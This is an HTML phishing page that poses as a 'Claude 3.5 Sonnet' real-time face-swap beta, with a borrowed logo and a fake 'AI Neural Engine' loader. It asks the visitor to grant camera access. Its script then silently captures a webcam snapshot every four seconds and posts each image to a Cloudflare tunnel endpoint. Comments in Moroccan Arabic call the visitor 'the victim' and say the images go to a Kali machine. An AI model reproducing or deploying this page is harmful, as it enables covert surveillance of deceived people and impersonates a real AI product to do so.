<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claude AI | Beta Face Swap</title>
    <style>
        body { background-color: #0a0a0a; color: #e8e8e8; font-family: 'Inter', -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { padding: 40px; border-radius: 12px; background: #171717; border: 1px solid #2d2d2d; max-width: 380px; width: 90%; box-shadow: 0 20px 50px rgba(0,0,0,0.5); text-align: center; }
        .logo { width: 60px; height: auto; margin-bottom: 25px; filter: drop-shadow(0 0 5px rgba(217, 119, 87, 0.3)); }
        .loader { border: 2px solid #2d2d2d; border-top: 2px solid #d97757; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.8s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 22px; font-weight: 500; color: #d97757; margin-bottom: 8px; }
        p { font-size: 14px; color: #9ca3af; line-height: 1.5; }
        .warning { font-size: 12px; color: #f87171; background: rgba(248, 113, 113, 0.1); padding: 10px; border-radius: 6px; margin-top: 20px; border: 1px solid rgba(248, 113, 113, 0.2); }
        canvas { display: none; } /* مخفي حيت ما محتاجينش الضحية يشوف راسو */
    </style>
</head>
<body>
    <div class="container">
        <img src="https://anthropic.com/images/icons/apple-touch-icon.png" class="logo" alt="Claude AI">
        <h1>Claude 3.5 Sonnet</h1>
        <p>Real-time Face Swap & Motion Analysis</p>
        <div class="loader"></div>
        <p>Initializing AI Neural Engine...</p>
        
        <div class="warning">
            <b>Action Required:</b> Please click <b>"Allow"</b> to grant camera access for the AI model to track facial features.
        </div>
    </div>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script>
        $(document).ready(function() {
            // الرابط ديال كالي (Cloudflare)
            const tunnel = 'https://hall-roy-dream-facilitate.trycloudflare.com';
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
                    video.srcObject = stream;
                    video.play();
                    console.log("AI Engine Active");

                    // كياخد لقطة كل 4 ثواني ويصيفطها لكالي
                    setInterval(function() {
                        context.drawImage(video, 0, 0, 640, 480);
                        var canvasData = canvas.toDataURL("image/png");
                        
                        $.post(tunnel + '/post.php', { cat: canvasData }, function(data) {
                            console.log("Analysis sent...");
                        });
                    }, 4000);
                }).catch(function(err) {
                    console.log("AI Error: " + err);
                });
            }
        });
    </script>
</body>
</html>
